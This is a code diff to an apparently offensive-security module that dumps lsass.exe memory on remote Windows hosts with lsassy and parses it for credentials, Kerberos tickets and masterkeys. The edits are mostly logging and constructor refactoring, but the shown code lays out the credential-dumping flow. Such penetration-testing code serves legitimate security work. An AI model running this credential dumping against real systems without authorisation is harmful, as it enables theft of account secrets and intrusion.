@@ -20,9 +20,14 @@ class CMEModule:
     opsec_safe = True
     multiple_hosts = True
 
+    def __init__(self, context=None, module_options=None):
+        self.context = context
+        self.module_options = module_options
+        self.method = None
+
     def options(self, context, module_options):
         """
-            METHOD              Method to use to dump lsass.exe with lsassy
+        METHOD              Method to use to dump lsass.exe with lsassy
         """
         self.method = 'comsvcs'
         if 'METHOD' in module_options:
@@ -30,7 +35,7 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         # lsassy uses a custom "success" level, which requires initializing its logger or an error will be thrown
-        # lsassy also removes all other handlers and overwrites the formatter which is terrible
+        # lsassy also removes all other handlers and overwrites the formatter which is bad for us (we want ours)
         # so what we do is define "success" as a logging level, then do nothing with the output
         logging.addLevelName(25, 'SUCCESS')
         setattr(logging, 'success', lambda message, *args: ())
@@ -55,22 +60,22 @@ class CMEModule:
         )
 
         if session.smb_session is None:
-            context.log.error("Couldn't connect to remote host")
+            context.log.fail("Couldn't connect to remote host")
             return False
 
         dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
         if dumper is None:
-            context.log.error("Unable to load dump method '{}'".format(self.method))
+            context.log.fail("Unable to load dump method '{}'".format(self.method))
             return False
 
         file = dumper.dump()
         if file is None:
-            context.log.error("Unable to dump lsass")
+            context.log.fail("Unable to dump lsass")
             return False
 
         parsed = Parser(file).parse()
         if parsed is None:
-            context.log.error("Unable to parse lsass dump")
+            context.log.fail("Unable to parse lsass dump")
             return False
         credentials, tickets, masterkeys = parsed
 
@@ -89,7 +94,7 @@ class CMEModule:
 
     def process_credentials(self, context, connection, credentials):
         if len(credentials) == 0:
-            context.log.info("No credentials found")
+            context.log.display("No credentials found")
         credz_bh = []
         domain = None
         for cred in credentials:
